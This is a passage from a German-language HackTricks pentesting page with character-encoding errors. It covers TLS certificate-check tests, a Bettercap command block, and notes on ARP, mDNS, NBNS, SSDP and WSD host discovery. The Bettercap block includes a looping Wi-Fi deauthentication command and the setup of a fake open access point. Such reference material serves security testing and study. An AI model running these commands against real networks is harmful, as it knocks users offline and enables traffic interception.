Andere Dinge, die getestet werden k√∂nnen, sind das Signieren des Zertifikats mit einem g√ºltigen Zertifikat, das jedoch keine g√ºltige CA ist. Oder die Verwendung des g√ºltigen √∂ffentlichen Schl√ºssels, um die Verwendung eines Algorithmus wie Diffie-Hellman zu erzwingen (einen, der nichts mit dem echten privaten Schl√ºssel entschl√ºsseln muss) und wenn der Client eine √úberpr√ºfung des echten privaten Schl√ºssels anfordert (wie einen Hash), eine gef√§lschte √úberpr√ºfung senden und erwarten, dass der Client dies nicht √ºberpr√ºft.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktive Entdeckungsnotizen

Beachten Sie, dass bei dem Versenden eines UDP-Pakets an ein Ger√§t, das den angeforderten Port nicht hat, ein ICMP (Port Unreachable) gesendet wird.

### **ARP-Entdeckung**

ARP-Pakete werden verwendet, um herauszufinden, welche IPs im Netzwerk verwendet werden. Der PC muss eine Anfrage f√ºr jede m√∂gliche IP-Adresse senden und nur diejenigen, die verwendet werden, antworten.

### **mDNS (Multicast DNS)**

Bettercap sendet alle X ms eine MDNS-Anfrage, in der nach **\_services\_.dns-sd.\_udp.local** gefragt wird. Die Maschine, die dieses Paket sieht, antwortet normalerweise auf diese Anfrage. Dann sucht es nur nach Maschinen, die auf "services" antworten.

**Werkzeuge**

* Avahi-Browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap sendet Broadcast-Pakete an den Port 137/UDP und fragt nach dem Namen "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap sendet SSDP-Broadcast-Pakete, um nach allen Arten von Diensten zu suchen (UDP-Port 1900).

### **WSD (Web Service Discovery)**

Bettercap sendet WSD-Broadcast-Pakete, um nach Diensten zu suchen (UDP-Port 3702).

## Referenzen

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3. Auflage)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Von Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie noch heute unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und verdienen Sie Pr√§mien von bis zu **100.000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
